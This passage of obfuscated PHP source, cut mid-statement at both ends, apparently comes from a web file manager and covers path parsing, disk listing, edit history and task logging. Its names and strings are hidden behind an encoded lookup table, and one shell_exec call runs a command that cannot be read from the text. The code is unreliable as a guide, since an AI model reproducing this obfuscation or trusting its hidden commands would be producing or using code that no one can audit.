self::getBasePath(); } if (substr($±Ğ–‚õ¤, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $»«ùûº” = self::pathHistory($±Ğ–‚õ¤); $»ÆÙôÙ› = array($ĞÛ…•şí[1250] => $»«ùûº” . $ĞÛ…•şí[1237], $ĞÛ…•şí[1249] => rtrim(get_path_father($»«ùûº”), $ĞÛ…•şí[8]) . $ĞÛ…•şí[8], $ĞÛ…•şí[369] => array()); $»…ş„ë = IO::getContent($»ÆÙôÙ›[$ĞÛ…•şí[1250]]); if ($»…ş„ë) { $’áªÔ³½ = json_decode($»…ş„ë, !0); if (is_array($’áªÔ³½)) { $»ÆÙôÙ›[$ĞÛ…•şí[369]] = $’áªÔ³½; } } return $»ÆÙôÙ›; } private static function saveData($©³ïüÍô, $úŞ±ûÔº) { $ÙÏÕŸñˆ =& $_SERVER[ùÆÎÔ“Ñ]; self::log($ÙÏÕŸñˆ[1253] . $©³ïüÍô . $ÙÏÕŸñˆ[71] . count($úŞ±ûÔº), $ÙÏÕŸñˆ[753]); if ($úŞ±ûÔº) { return IO::setContent($©³ïüÍô, json_encode($úŞ±ûÔº)); } $ÔµÇöó¾ = IO::pathFather($©³ïüÍô); IO::remove($©³ïüÍô); self::clearEmptyFolder($ÔµÇöó¾); return !0; } public static function clearEmptyFolder($ÔĞ™ıôİ) { $»É÷ÍøÕ =& $_SERVER[ùÆÎÔ“Ñ]; if (trim($ÔĞ™ıôİ, $»É÷ÍøÕ[8]) == trim(self::$_historyBase, $»É÷ÍøÕ[8])) { return; } $ô’Ãú´› = IO::pathFather($ÔĞ™ıôİ); $Ù²ú¡³ø = IO::has($ÔĞ™ıôİ, !0); if ($Ù²ú¡³ø[$»É÷ÍøÕ[207]] > 0 || $Ù²ú¡³ø[$»É÷ÍøÕ[208]] > 0) { return; } IO::remove($ÔĞ™ıôİ); self::clearEmptyFolder($ô’Ãú´›); } private static function getBasePath() { $”‘»ïŸ =& $_SERVER[ùÆÎÔ“Ñ]; $À««éï = Model($”‘»ïŸ[1254])->get($”‘»ïŸ[1255]); if ($À««éï) { if (!IO::exist($À««éï)) { IO::mkdir($À««éï); } if (get_path_this($À««éï) == $”‘»ïŸ[1240]) { $»àÚŒê = $”‘»ïŸ[1256] . rand_string(8); @rename($À««éï, get_path_father($À««éï) . $”‘»ïŸ[8] . $»àÚŒê); $À««éï = DATA_PATH . $»àÚŒê . $”‘»ïŸ[8]; file_put_contents(DATA_PATH . $”‘»ïŸ[1190], $”‘»ïŸ[12]); Model($”‘»ïŸ[1254])->set($”‘»ïŸ[1255], $À««éï); } return $À««éï; } $À««éï = DATA_PATH . $”‘»ïŸ[1256] . rand_string(8) . $”‘»ïŸ[8]; $À««éï = IO::mkdir($À««éï); $À««éï = rtrim($À««éï, $”‘»ïŸ[8]) . $”‘»ïŸ[8]; file_put_contents($À««éï . $”‘»ïŸ[1190], $”‘»ïŸ[12]); file_put_contents(DATA_PATH . $”‘»ïŸ[1190], $”‘»ïŸ[12]); Model($”‘»ïŸ[1254])->set($”‘»ïŸ[1255], $À««éï); return $À««éï; } } class KodIO { const KOD_SOURCE = "\173\x73\157\x75\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\x72\122\x65\x63\x79\143\x6c\145\175"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\x46\151\154\x65\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\106\x69\154\x65\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\x75\160\x52\157\157\x74\123\x65\154\146\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\162\123\150\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\x72\123\x68\141\x72\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\x65\124\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\x65\x49\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\150\141\162\145\111\164\145\x6d\114\151\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\145\141\x72\143\150\175"; const KOD_BLOCK = "\173\142\x6c\157\143\x6b\175"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\162\x52\x65\x6e\143\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\x64\162\151\x76\x65\162\x7d"; public static function typeList() { $Ç£ •‹˜ =& $_SERVER[ùÆÎÔ“Ñ]; return array($Ç£ •‹˜[1257] => self::KOD_SOURCE, $Ç£ •‹˜[1258] => self::KOD_USER_RECYCLE, $Ç£ •‹˜[1259] => self::KOD_USER_FAV, $Ç£ •‹˜[1260] => self::KOD_USER_FILE_TAG, $Ç£ •‹˜[1261] => self::KOD_USER_FILE_TYPE, $Ç£ •‹˜[1262] => self::KOD_GROUP_ROOT_SELF, $Ç£ •‹˜[1263] => self::KOD_USER_SHARE, $Ç£ •‹˜[1264] => self::KOD_USER_SHARE_LINK, $Ç£ •‹˜[1265] => self::KOD_USER_SHARE_TO_ME, $Ç£ •‹˜[1266] => self::KOD_SHARE_ITEM, $Ç£ •‹˜[1267] => self::KOD_SHARE_LINK, $Ç£ •‹˜[1268] => self::KOD_SEARCH, $Ç£ •‹˜[1269] => self::KOD_BLOCK, $Ç£ •‹˜[1270] => self::KOD_IO, $Ç£ •‹˜[1271] => self::KOD_USER_RECENT, $Ç£ •‹˜[1272] => self::KOD_USER_DRIVER); } public static function parse($ÍÔ‚È¬ü) { $©¥üÖ÷ù =& $_SERVER[ùÆÎÔ“Ñ]; $ÍÔ‚È¬ü = self::clear($ÍÔ‚È¬ü); $ïèò¢³ı = array_values(self::typeList()); preg_match($©¥üÖ÷ù[1273], $ÍÔ‚È¬ü, $«Õª©¯î); $Ó”»¦ş = array($©¥üÖ÷ù[422] => !1, $©¥üÖ÷ù[1274] => !1, $©¥üÖ÷ù[419] => !1, $©¥üÖ÷ù[84] => $ÍÔ‚È¬ü, $©¥üÖ÷ù[1175] => !1, $©¥üÖ÷ù[1174] => $©¥üÖ÷ù[12]); if (is_array($«Õª©¯î) && count($«Õª©¯î) == 5) { $¾‘éŒ¸Ù = $©¥üÖ÷ù[1275] . $«Õª©¯î[2] . $©¥üÖ÷ù[327]; if (in_array($¾‘éŒ¸Ù, $ïèò¢³ı)) { $Ó”»¦ş[$©¥üÖ÷ù[1175]] = $«Õª©¯î[1]; $Ó”»¦ş[$©¥üÖ÷ù[33]] = $¾‘éŒ¸Ù; $Ó”»¦ş[$©¥üÖ÷ù[1276]] = substr($¾‘éŒ¸Ù, 1, -1); $Ó”»¦ş[$©¥üÖ÷ù[399]] = $«Õª©¯î[3]; } $Ó”»¦ş[$©¥üÖ÷ù[1174]] = $«Õª©¯î[4]; } $š ºé¦ = array($©¥üÖ÷ù[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ó”»¦ş[$©¥üÖ÷ù[1239]] = in_array($Ó”»¦ş[$©¥üÖ÷ù[33]], $š ºé¦); return $Ó”»¦ş; } public static function isTruePath($ƒµ‹óÎâ) { $…â¾ì™ç =& $_SERVER[ùÆÎÔ“Ñ]; if (substr($ƒµ‹óÎâ, 0, 1) != $…â¾ì™ç[1275]) { return !0; } if (strpos($ƒµ‹óÎâ, $…â¾ì™ç[408]) === 0) { return !0; } if (strpos($ƒµ‹óÎâ, $…â¾ì™ç[1243]) === 0) { return !0; } if (strpos($ƒµ‹óÎâ, $…â¾ì™ç[1277]) === 0) { return !0; } if (strpos($ƒµ‹óÎâ, $…â¾ì™ç[1278]) === 0) { return !0; } if (strpos($ƒµ‹óÎâ, $…â¾ì™ç[1279]) === 0) { return !0; } return !1; } public static function clear($®ÒÅ·¨Ö) { $¾ÀÁŸæ =& $_SERVER[ùÆÎÔ“Ñ]; $®ÒÅ·¨Ö = str_replace(array($¾ÀÁŸæ[1083], $¾ÀÁŸæ[231]), $¾ÀÁŸæ[53], $®ÒÅ·¨Ö); $®ÒÅ·¨Ö = str_replace($¾ÀÁŸæ[97], $¾ÀÁŸæ[8], $®ÒÅ·¨Ö); $´äÆÎÓã = $¾ÀÁŸæ[1280]; if (substr($®ÒÅ·¨Ö, 0, 3) == $¾ÀÁŸæ[1281]) { $®ÒÅ·¨Ö = substr($®ÒÅ·¨Ö, 3); } while (strstr($®ÒÅ·¨Ö, $´äÆÎÓã)) { $®ÒÅ·¨Ö = str_replace($´äÆÎÓã, $¾ÀÁŸæ[8], $®ÒÅ·¨Ö); } $®ÒÅ·¨Ö = preg_replace($¾ÀÁŸæ[1282], $¾ÀÁŸæ[8], $®ÒÅ·¨Ö); if ($®ÒÅ·¨Ö == $¾ÀÁŸæ[8]) { return $¾ÀÁŸæ[8]; } $®ÒÅ·¨Ö = rtrim($®ÒÅ·¨Ö, $¾ÀÁŸæ[8]); return $®ÒÅ·¨Ö; } public static function sourceID($¾¸˜®) { $ÉÑ€ñ’œ =& $_SERVER[ùÆÎÔ“Ñ]; $˜ØµÌÍ = self::parse($¾¸˜®); if ($˜ØµÌÍ[$ÉÑ€ñ’œ[33]] !== self::KOD_SOURCE) { show_json(LNG($ÉÑ€ñ’œ[1283]), !1); } return $˜ØµÌÍ[$ÉÑ€ñ’œ[399]]; } public static function make($½ÇÁçÒê) { if (!$½ÇÁçÒê) { return !1; } return self::makePath(self::KOD_SOURCE, intval($½ÇÁçÒê)); } public static function makeShare($·ÎÑ»Å†, $…¹¥ú¼Ö) { return self::makePath(self::KOD_SHARE_ITEM, $·ÎÑ»Å†, $…¹¥ú¼Ö); } public static function makeFileTypePath($Ã®¢‹°à) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ã®¢‹°à); } public static function makeFileTagPath($…°•ÉØ) { return self::makePath(self::KOD_USER_FILE_TAG, $…°•ÉØ); } public static function makePath($àüŞ÷î, $’­ƒ¨¾­ = '', $¨ã’Ÿí¼ = '') { $â¬ŠÏÜç =& $_SERVER[ùÆÎÔ“Ñ]; $‹´‘¬¹Ú = substr($àüŞ÷î, 1, -1); $“ÙíÚ— = $â¬ŠÏÜç[1284] . $‹´‘¬¹Ú . $â¬ŠÏÜç[1285] . $’­ƒ¨¾­ . $â¬ŠÏÜç[1286]; $“ÙíÚ— = $¨ã’Ÿí¼ ? $“ÙíÚ— . $¨ã’Ÿí¼ . $â¬ŠÏÜç[8] : $“ÙíÚ—; return $“ÙíÚ—; } public static function hashPath($¼½™ ¶Ã, $×ÅøŸÆö = true) { $Ã½Ë°³Ö =& $_SERVER[ùÆÎÔ“Ñ]; $‰Ï½¼ÙÓ = is_array($¼½™ ¶Ã) ? $¼½™ ¶Ã : IO::info($¼½™ ¶Ã); $‡¤¸×Â¡ = _get($‰Ï½¼ÙÓ, $Ã½Ë°³Ö[1287], $Ã½Ë°³Ö[12]); if (!$‡¤¸×Â¡ && isset($‰Ï½¼ÙÓ[$Ã½Ë°³Ö[402]])) { $‰Ï½¼ÙÓ = IO::info(KodIO::make($‰Ï½¼ÙÓ[$Ã½Ë°³Ö[402]])); $‡¤¸×Â¡ = _get($‰Ï½¼ÙÓ, $Ã½Ë°³Ö[1287], $Ã½Ë°³Ö[12]); } if (!$‡¤¸×Â¡ && $×ÅøŸÆö) { $‡Æ¸Â°¼ = KodIO::parse($‰Ï½¼ÙÓ[$Ã½Ë°³Ö[84]]); if (!$‡Æ¸Â°¼[$Ã½Ë°³Ö[33]]) { $‡¤¸×Â¡ = IO::hashSimple($‰Ï½¼ÙÓ[$Ã½Ë°³Ö[84]]); } } if (!$‡¤¸×Â¡) { $‡¤¸×Â¡ = md5($‰Ï½¼ÙÓ[$Ã½Ë°³Ö[84]] . $‰Ï½¼ÙÓ[$Ã½Ë°³Ö[76]] . $‰Ï½¼ÙÓ[$Ã½Ë°³Ö[85]]); } return $‡¤¸×Â¡; } public static function hashPathSafe($ğíû¹¥§, $Á„Ô…İ« = true) { $â»ç°— =& $_SERVER[ùÆÎÔ“Ñ]; $ôÁ×Ü›é = self::hashPath($ğíû¹¥§, $Á„Ô…İ«); return md5($ôÁ×Ü›é . $â»ç°—[1288] . Model($â»ç°—[771])->get($â»ç°—[772])); } public static function initSystemPath() { $áêÑÌçã =& $_SERVER[ùÆÎÔ“Ñ]; if (defined($áêÑÌçã[1289])) { return; } define($áêÑÌçã[1289], self::systemPath($áêÑÌçã[1290])); define($áêÑÌçã[1291], self::systemPath($áêÑÌçã[1292])); define($áêÑÌçã[1293], self::systemPath($áêÑÌçã[1294])); define($áêÑÌçã[1295], self::systemPath($áêÑÌçã[1296])); IOHistory::bindEvent(); } public static function systemPath($¯Á©Çç„) { $üööïÎ =& $_SERVER[ùÆÎÔ“Ñ]; $–Ñ·åÁ¾ = $üööïÎ[1297] . ucfirst($¯Á©Çç„); $•üˆºÍç = Model($üööïÎ[771])->get($–Ñ·åÁ¾); if ($•üˆºÍç) { return $•üˆºÍç; } if ($¯Á©Çç„ == $üööïÎ[1290]) { $•üˆºÍç = self::make(Model($üööïÎ[826])->systemRootPathAdd($üööïÎ[544])); } else { $•üˆºÍç = self::systemPath($üööïÎ[1290]); $¹­‰¾•­ = self::sourceID($•üˆºÍç); $•üˆºÍç = self::make(Model($üööïÎ[826])->mkdir($¹­‰¾•­, $¯Á©Çç„)); } Model($üööïÎ[771])->set($–Ñ·åÁ¾, $•üˆºÍç); return $•üˆºÍç; } public static function systemFolder($Şùãçô) { $±šä‡±¿ = IO_PATH_SYSTEM_SOURCE . $Şùãçô; $šÇş³Íú = Cache::get($±šä‡±¿); if (!$šÇş³Íú) { $¤Ëõú»Ê = IO::infoFull($±šä‡±¿); if (!$¤Ëõú»Ê) { $šÇş³Íú = IO::mkdir($±šä‡±¿, REPEAT_SKIP); } else { $šÇş³Íú = $¤Ëõú»Ê[$_SERVER[ùÆÎÔ“Ñ][84]]; } Cache::set($±šä‡±¿, $šÇş³Íú, 3600 * 10); } return $šÇş³Íú; } public static function defaultDriver() { return Model($_SERVER[ùÆÎÔ“Ñ][768])->defaultDriver(); } public static function defaultIO() { $´×Ü– =& $_SERVER[ùÆÎÔ“Ñ]; $ˆÁ’ñÊÚ = self::defaultDriver(); return $´×Ü–[1298] . $ˆÁ’ñÊÚ[$´×Ü–[399]] . $´×Ü–[1286]; } public static function defaultDriverInit() { static $œÑ¥Ü’  = false; if ($œÑ¥Ü’ ) { return $œÑ¥Ü’ ; } $œÑ¥Ü’  = IO::init(self::defaultIO()); return $œÑ¥Ü’ ; } public static function fileTypeList() { $Â±ìÍ =& $_SERVER[ùÆÎÔ“Ñ]; $›†«µ  = $GLOBALS[$Â±ìÍ[6]][$Â±ìÍ[1299]]; foreach ($›†«µ  as $†Ä‘Óø => $íÎôÉÔ) { $¸³É ÷ª = $Â±ìÍ[1300] . $†Ä‘Óø; $ƒ¦˜¯é = LNG($¸³É ÷ª); if ($¸³É ÷ª != $ƒ¦˜¯é) { $›†«µ [$†Ä‘Óø][$Â±ìÍ[32]] = $ƒ¦˜¯é; } } return $›†«µ ; } public static function diskList($šü©óŠÉ = true) { $ü ¢Ôº = $_SERVER[ùÆÎÔ“Ñ][1301]; if ($šü©óŠÉ) { $Şˆö•ÉÒ = Cache::get($ü ¢Ôº); if (is_array($Şˆö•ÉÒ)) { return $Şˆö•ÉÒ; } } $Şˆö•ÉÒ = self::diskListGet(); Cache::set($ü ¢Ôº, $Şˆö•ÉÒ, 60); return $Şˆö•ÉÒ; } public static function diskListGet() { $”Ç–²ì× =& $_SERVER[ùÆÎÔ“Ñ]; $¥Ğ¿×‘Ş = array(); if ($GLOBALS[$”Ç–²ì×[6]][$”Ç–²ì×[1302]] == $”Ç–²ì×[1303]) { $µàÉå• = $”Ç–²ì×[1304]; for ($ƒšÎÒ˜‘ = 0; $ƒšÎÒ˜‘ < strlen($µàÉå•); $ƒšÎÒ˜‘++) { $ØæÂÅŒó = $µàÉå•[$ƒšÎÒ˜‘] . $”Ç–²ì×[1305]; if (file_exists($ØæÂÅŒó)) { $¥Ğ¿×‘Ş[] = $ØæÂÅŒó; } } return $¥Ğ¿×‘Ş; } if (!function_exists($”Ç–²ì×[98])) { $¥Ğ¿×‘Ş[] = $”Ç–²ì×[836]; return $¥Ğ¿×‘Ş; } $¼Ñ¼ŸÏ× = explode($”Ç–²ì×[231], shell_exec($”Ç–²ì×[1306])); array_shift($¼Ñ¼ŸÏ×); array_pop($¼Ñ¼ŸÏ×); $öñ…ªÀÅ = array($”Ç–²ì×[1307], $”Ç–²ì×[1308], $”Ç–²ì×[1309], $”Ç–²ì×[1310], $”Ç–²ì×[1311], $”Ç–²ì×[1312], $”Ç–²ì×[1313], $”Ç–²ì×[1314]); foreach ($¼Ñ¼ŸÏ× as $‰Úô—œ¤) { $‘ä·õ¿– = preg_split($”Ç–²ì×[1315], $‰Úô—œ¤); $ØæÂÅŒó = $‘ä·õ¿–[count($‘ä·õ¿–) - 1]; if (!strstr($‘ä·õ¿–[0], $”Ç–²ì×[1316]) || !$ØæÂÅŒó) { continue; } $Óµ§˜à¿ = rtrim($ØæÂÅŒó, $”Ç–²ì×[8]) . $”Ç–²ì×[8]; if (in_array($Óµ§˜à¿, $öñ…ªÀÅ)) { continue; } $¥Ğ¿×‘Ş[] = $Óµ§˜à¿; } return $¥Ğ¿×‘Ş; } public static function isSameDisk($ºßŸ ’Ò, $Êê–ÕÓ) { $©£Âßçæ =& $_SERVER[ùÆÎÔ“Ñ]; if ($GLOBALS[$©£Âßçæ[6]][$©£Âßçæ[1302]] == $©£Âßçæ[1303]) { return strtolower(substr($ºßŸ ’Ò, 0, 1)) == strtolower(substr($Êê–ÕÓ, 0, 1)); } $ •Â›·– = self::diskList(); $¦ˆ¸˜Ô = !1; $ì®Ôœğˆ = !1; sort($ •Â›·–); $ •Â›·– = array_reverse($ •Â›·–); $ºßŸ ’Ò = rtrim($ºßŸ ’Ò, $©£Âßçæ[8]) . $©£Âßçæ[8]; $Êê–ÕÓ = rtrim($Êê–ÕÓ, $©£Âßçæ[8]) . $©£Âßçæ[8]; foreach ($ •Â›·– as $§­ù‰û) { $ÎÅ¶ÅëÄ = strlen($§­ù‰û); if (!$¦ˆ¸˜Ô && substr($ºßŸ ’Ò, 0, $ÎÅ¶ÅëÄ) == $§­ù‰û) { $¦ˆ¸˜Ô = $§­ù‰û; } if (!$ì®Ôœğˆ && substr($Êê–ÕÓ, 0, $ÎÅ¶ÅëÄ) == $§­ù‰û) { $ì®Ôœğˆ = $§­ù‰û; } if ($¦ˆ¸˜Ô && $ì®Ôœğˆ) { break; } } return $¦ˆ¸˜Ô === $ì®Ôœğˆ; } public static function transferType($ƒºÑÀÂÛ, $êª®¢Øù) { $ïúÊ®›” =& $_SERVER[ùÆÎÔ“Ñ]; $š”à»  = self::driverType($ƒºÑÀÂÛ); $à¤úÉ´Ü = self::driverType($êª®¢Øù); if ($š”à» [$ïúÊ®›”[33]] == $à¤úÉ´Ü[$ïúÊ®›”[33]] && $š”à» [$ïúÊ®›”[1317]] == $à¤úÉ´Ü[$ïúÊ®›”[1317]]) { return $ïúÊ®›”[1318]; } if ($š”à» [$ïúÊ®›”[33]] == $ïúÊ®›”[873] && $à¤úÉ´Ü[$ïúÊ®›”[33]] == $ïúÊ®›”[106]) { return $ïúÊ®›”[1200]; } if ($š”à» [$ïúÊ®›”[33]] == $ïúÊ®›”[106] && $à¤úÉ´Ü[$ïúÊ®›”[33]] == $ïúÊ®›”[873]) { return $ïúÊ®›”[107]; } return $ïúÊ®›”[1319]; } public static function driverType($†Ç¦òü) { $Èê²ú„ =& $_SERVER[ùÆÎÔ“Ñ]; $›Ò¤‹‰¼ = str_replace($Èê²ú„[1320], $Èê²ú„[12], strtolower($†Ç¦òü->getType())); if ($›Ò¤‹‰¼ == $Èê²ú„[759] || $›Ò¤‹‰¼ == $Èê²ú„[1321] || $›Ò¤‹‰¼ == $Èê²ú„[1322]) { $†Ç¦òü = self::defaultDriverInit(); } else { if ($›Ò¤‹‰¼ == $Èê²ú„[1210] || $›Ò¤‹‰¼ == $Èê²ú„[1323]) { $†Ç¦òü = IO::init($†Ç¦òü->pathParse[$Èê²ú„[1156]]); } } $¨¤¸º»´ = $†Ç¦òü->path; $›Ò¤‹‰¼ = str_replace($Èê²ú„[1320], $Èê²ú„[12], strtolower($†Ç¦òü->getType())); if ($›Ò¤‹‰¼ == $Èê²ú„[106]) { return array($Èê²ú„[33] => $Èê²ú„[106], $Èê²ú„[1317] => $Èê²ú„[12], $Èê²ú„[84] => $¨¤¸º»´); } return array($Èê²ú„[33] => $Èê²ú„[873], $Èê²ú„[1317] => $†Ç¦òü->pathDriver, $Èê²ú„[84] => $¨¤¸º»´); } public static function pathDriverType($ñÄ»ê× ) { return $ñÄ»ê×  ? self::driverType(IO::init($ñÄ»ê× )) : !1; } } goto E“Ã¼á¦Ë; eöÈ¼äêÃà: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ò¤š‰í , $·ıÌì¯ = '', $Ò»şÄšÆ = 0, $Üç¥ÛÑ = '') { $üç¡Ò˜ª =& $_SERVER[ùÆÎÔ“Ñ]; $îø‹·‘ = new Task($Ò¤š‰í , $·ıÌì¯, $Ò»şÄšÆ, $Üç¥ÛÑ); $GLOBALS[$üç¡Ò˜ª[1751] . $Ò¤š‰í ] = new TaskLog($üç¡Ò˜ª[1651], $îø‹·‘, $Üç¥ÛÑ); return $îø‹·‘; } public function __construct($á—„‰½ = '', $ÚÏ“¹— = '', $ñ›Ç›´Ù = '') { $®¶“›©ô =& $_SERVER[ùÆÎÔ“Ñ]; if (!$á—„‰½) { $á—„‰½ = $®¶“›©ô[1651]; } $Äá‰ß¼¿ = $á—„‰½ . $®¶“›©ô[386] . rand_string(10); if (!$ñ›Ç›´Ù) { $ñ›Ç›´Ù = $á—„‰½ . $®¶“›©ô[53] . $ñ›Ç›´Ù; } switch ($á—„‰½) { case $®¶“›©ô[1651]: if (!$ÚÏ“¹— || !$ÚÏ“¹—->task) { return echoLog($á—„‰½ . $®¶“›©ô[1752]); } $ùåÒ‰£— = $ÚÏ“¹—; $Äá‰ß¼¿ = $ùåÒ‰£—->task[$®¶“›©ô[399]]; $á—„‰½ = $ùåÒ‰£—->task[$®¶“›©ô[399]]; if (!$ùåÒ‰£—->task[$®¶“›©ô[1567]]) { $ùåÒ‰£—->task[$®¶“›©ô[1567]] = $ñ›Ç›´Ù ? $ñ›Ç›´Ù : $á—„‰½; } break; case $®¶“›©ô[1753]: if (!$ÚÏ“¹—) { return echoLog($á—„‰½ . $®¶“›©ô[1754]); } $í¡±Şˆ® = is_string($ÚÏ“¹—) ? array($ÚÏ“¹—) : $ÚÏ“¹—; $ùåÒ‰£— = new TaskFileTransfer($Äá‰ß¼¿, $á—„‰½, 0, $ñ›Ç›´Ù ? $ñ›Ç›´Ù : $í¡±Şˆ®[0]); foreach ($í¡±Şˆ® as $Ó²—¹ ­) { $ùåÒ‰£—->addPath($Ó²—¹ ­); } break; case $®¶“›©ô[313]: if (!$ÚÏ“¹—) { return echoLog($á—„‰½ . $®¶“›©ô[1754]); } $í¡±Şˆ® = is_string($ÚÏ“¹—) ? array($ÚÏ“¹—) : $ÚÏ“¹—; $ùåÒ‰£— = new TaskZip($Äá‰ß¼¿, $á—„‰½, 0, $ñ›Ç›´Ù ? $ñ›Ç›´Ù : $í¡±Şˆ®[0]); foreach ($í¡±Şˆ® as $Ó²—¹ ­) { $ùåÒ‰£—->addPath($Ó²—¹ ­); } break; case $®¶“›©ô[1220]: if (!$ÚÏ“¹—) { return echoLog($á—„‰½ . $®¶“›©ô[1754]); } $ùåÒ‰£— = new TaskUnZip($Äá‰ß¼¿, $á—„‰½, 0, $ñ›Ç›´Ù ? $ñ›Ç›´Ù : $ÚÏ“¹—); if ($ÚÏ“¹—) { $ùåÒ‰£—->addFile($ÚÏ“¹—); } break; case $®¶“›©ô[148]: $ùåÒ‰£— = new TaskHttp($Äá‰ß¼¿, $á—„‰½); break; default: return; break; } $this->task = $ùåÒ‰£—; $this->taskID = $Äá‰ß¼¿; Hook::bind($®¶“›©ô[1689], array($this, $®¶“›©ô[1755])); Hook::bind($®¶“›©ô[1691], array($this, $®¶“›©ô[1756])); Hook::bind($®¶“›©ô[1685], array($this, $®¶“›©ô[1757])); echoLog($®¶“›©ô[1758] . $ùåÒ‰£—->task[$®¶“›©ô[1567]]); } public function __destruct() { $this->end(); } public function end($¡€Ğè­Ú = '') { $˜ÆşŒ° =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¡€Ğè­Ú); $this->task = !1; $this->taskID = !1; Hook::unbind($˜ÆşŒ°[1689], array($this, $˜ÆşŒ°[1755])); Hook::unbind($˜ÆşŒ°[1691], array($this, $˜ÆşŒ°[1756])); Hook::unbind($˜ÆşŒ°[1685], array($this, $˜ÆşŒ°[1757])); } public function taskUpdate($Ÿõ¬Ùº) { $«ŒùÁÙ– =& $_SERVER[ùÆÎÔ“Ñ]; if (!$Ÿõ¬Ùº || $this->taskID != $Ÿõ¬Ùº[$«ŒùÁÙ–[399]]) { return; } $éö®×ßí = 20; $˜Ì¼÷³Î = intval($Ÿõ¬Ùº[$«ŒùÁÙ–[1669]] * $éö®×ßí); $¿°ÔÂÆÕ = $«ŒùÁÙ–[162] . str_repeat($«ŒùÁÙ–[889], $˜Ì¼÷³Î) . $«ŒùÁÙ–[1019] . str_repeat($«ŒùÁÙ–[53], $éö®×ßí - $˜Ì¼÷³Î) . $«ŒùÁÙ–[164]; $Û„ñ†Õö = $¿°ÔÂÆÕ . sprintf($«ŒùÁÙ–[1759], $Ÿõ¬Ùº[$«ŒùÁÙ–[1669]] * 100) . $«ŒùÁÙ–[1760]; $øã‚˜ŒË = $Û„ñ†Õö . $Ÿõ¬Ùº[$«ŒùÁÙ–[1668]] . $«ŒùÁÙ–[8] . $Ÿõ¬Ùº[$«ŒùÁÙ–[787]] . LNG($«ŒùÁÙ–[1761]); $¸ùÕşÓğ = $«ŒùÁÙ–[12]; if ($Ÿõ¬Ùº[$«ŒùÁÙ–[1745]]) { $øã‚˜ŒË = $Û„ñ†Õö . size_format($Ÿõ¬Ùº[$«ŒùÁÙ–[1668]]) . $«ŒùÁÙ–[8] . size_format($Ÿõ¬Ùº[$«ŒùÁÙ–[787]]); $¸ùÕşÓğ = size_format($Ÿõ¬Ùº[$«ŒùÁÙ–[1670]]) . $«ŒùÁÙ–[1762]; } if ($Ÿõ¬Ùº[$«ŒùÁÙ–[1069]]) { $Ÿõ¬Ùº[$«ŒùÁÙ–[1719]] = $Ÿõ¬Ùº[$«ŒùÁÙ–[1069]] . $«ŒùÁÙ–[53] . $Ÿõ¬Ùº[$«ŒùÁÙ–[1719]]; } if ($Ÿõ¬Ùº[$«ŒùÁÙ–[1719]]) { $¤ü°İö¹ = $«ŒùÁÙ–[12]; if ($Ÿõ¬Ùº[$«ŒùÁÙ–[1721]]) { $¤ü°İö¹ = size_format($Ÿõ¬Ùº[$«ŒùÁÙ–[1722]]) . $«ŒùÁÙ–[8] . size_format($Ÿõ¬Ùº[$«ŒùÁÙ–[1721]]); } $¸ùÕşÓğ .= $Ÿõ¬Ùº[$«ŒùÁÙ–[1719]] . $¤ü°İö¹; } if ($Ÿõ¬Ùº[$«ŒùÁÙ–[764]]) { $¸ùÕşÓğ .= $«ŒùÁÙ–[53] . size_format($Ÿõ¬Ùº[$«ŒùÁÙ–[1726]]) . $«ŒùÁÙ–[8] . size_format($Ÿõ¬Ùº[$«ŒùÁÙ–[764]]); } echoLog($øã‚˜ŒË . $«ŒùÁÙ–[53] . $¸ùÕşÓğ, !0); } public function taskEnd($ïìØØÆº) { $ùû¢½¨ã =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ïìØØÆº || $this->taskID != $ïìØØÆº[$ùû¢½¨ã[399]]) { return; } $²ÀÉóò² = $ïìØØÆº ? $ïìØØÆº[$ùû¢½¨ã[1668]] . $ùû¢½¨ã[8] . $ïìØØÆº[$ùû¢½¨ã[787]] . LNG($ùû¢½¨ã[1761]) . $ùû¢½¨ã[71] : $ùû¢½¨ã[12]; echoLog($ùû¢½¨ã[1763] . $ïìØØÆº[$ùû¢½¨ã[1567]] . ($ïìØØÆº[$ùû¢½¨ã[453]] ? $ùû¢½¨ã[71] . $ïìØØÆº[$ùû¢½¨ã[453]] : $ùû¢½¨ã[12]) . $ùû¢½¨ã[71] . $²ÀÉóò² . $ùû¢½¨ã[1764] . sprintf($ùû¢½¨ã[1683], timeFloat() - $ïìØØÆº[$ùû¢½¨ã[1671]]) . $ùû¢½¨ã[1684]); $this->end(); } public function taskKill($Í†ÏëÊŒ) { $ş¼ã‰’ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$Í†ÏëÊŒ || $this->taskID != $Í†ÏëÊŒ[$ş¼ã‰’[399]]) { return; } echoLog($ş¼ã‰’[1765] . $Í†ÏëÊŒ[$ş¼ã‰’[1567]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\153\x51\165\x65\165\145\x4c\145\156\147\x74\150"; const QUEUE_DATA = "\x74\x61\x73\153\x51\x75\x65\165\145\104\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($‹” êÇá, $ºÍ’¶¹ = array(), $ÁÍœ—¬ = '', $¿éÙçÕ¢ = '') { $Å¬œÑ¿Ù =& $_SERVER[ùÆÎÔ“Ñ]; if (self::$listData === 